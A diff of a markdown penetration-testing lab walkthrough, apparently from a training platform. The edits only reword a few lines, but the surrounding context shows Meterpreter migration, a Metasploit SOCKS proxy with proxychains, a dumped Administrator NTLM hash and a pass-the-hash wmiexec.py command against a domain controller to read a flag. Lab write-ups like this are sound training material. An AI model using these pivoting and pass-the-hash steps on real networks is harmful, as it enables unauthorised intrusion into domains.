@@ -187,7 +187,7 @@ Current pid: 1732
 [*] Migration completed successfully.
 ```
 
-transfer PowerView to the WEB01 machine, starting a Python web server from Pwnbox/PMVPN:
+Transfer PowerView to the WEB01 machine, starting a Python web server from Pwnbox/PMVPN:
 
 
 <img width="1027" height="239" alt="image" src="https://github.com/user-attachments/assets/db4564b1-cbe6-4917-86bd-a9067c02bea1" />
@@ -346,7 +346,7 @@ msf6 auxiliary(server/socks_proxy) > run
 [*] Starting the SOCKS proxy server
 ```
 
- Edit /etc/proxchains.conf, adding the socks5 proxy entry to the bottom of the config file:
+Edit /etc/proxchains.conf, adding the socks5 proxy entry to the bottom of the config file:
 
 ```
 sudo nano /etc/proxychains.conf
@@ -488,7 +488,7 @@ Administrator:des-cbc-md5:c2d9c892f2e6f2dc
 
 
 Use wmiexec.py as administrator and pass the hash aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 
-to be able to connect to DC01. Students will find the flag in C:\users\administrator\desktop\flag.txt:
+to be able to connect to DC01. The flag is in C:\users\administrator\desktop\flag.txt:
 
 ```
 proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
